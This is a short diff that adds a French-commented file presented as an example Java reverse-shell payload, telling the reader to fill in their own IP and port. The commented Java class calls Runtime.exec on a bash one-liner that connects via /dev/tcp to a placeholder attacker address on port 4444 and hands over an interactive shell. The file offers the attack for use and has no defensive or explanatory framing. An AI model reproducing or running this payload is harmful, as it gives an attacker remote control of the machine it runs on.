@@ -1,0 +1,11 @@
+# Exemple de payload Java (reverse shell)
+# Remplacez VOTRE_IP et PORT
+#
+# public class Payload {
+#     public static void main(String[] args) {
+#         try {
+#             Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/VOTRE_IP/4444 0>&1'");
+#         } catch (Exception e) {
+#         }
+#     }
+# }
